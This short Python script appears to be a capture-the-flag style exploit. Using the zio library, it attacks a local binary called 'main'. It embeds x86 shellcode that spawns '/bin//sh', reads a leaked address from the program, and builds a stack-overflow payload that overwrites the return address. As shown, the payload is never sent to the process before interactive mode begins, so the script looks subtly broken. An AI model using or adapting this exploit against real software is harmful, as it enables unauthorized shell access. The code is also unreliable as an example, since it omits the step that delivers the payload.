import zio

junk = "AAAABBBBCCCCDDDDEEEEFFFFGGGG"
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80"

Io = zio.zio("./main")
address = zio.l32(int(Io.readline().replace("Address : 0x", "")[0:8], 16))
payload = (shellcode + junk)[0:len(junk)] + address
Io.interact()
